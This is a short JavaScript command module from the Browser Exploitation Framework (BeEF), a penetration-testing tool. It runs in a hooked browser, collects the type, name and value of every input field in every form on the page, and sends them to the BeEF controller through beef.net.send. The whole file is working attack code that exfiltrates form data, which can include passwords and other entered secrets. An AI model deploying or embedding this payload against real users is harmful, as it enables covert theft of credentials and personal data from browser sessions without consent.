//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var form_data = new Array();

	// loop through all forms
	for (var f=0; f < document.forms.length; f++) {
		// store type,name,value for all input fields
		for (var i=0; i < document.forms[f].elements.length; i++) {
			form_data.push(new Array(document.forms[f].elements[i].type, document.forms[f].elements[i].name, document.forms[f].elements[i].value));
		}
	}

	// return form data
	if (form_data.length) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(form_data));
	// return if no input fields were found
	} else {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Could not find any forms on '+window.location);
	}

});

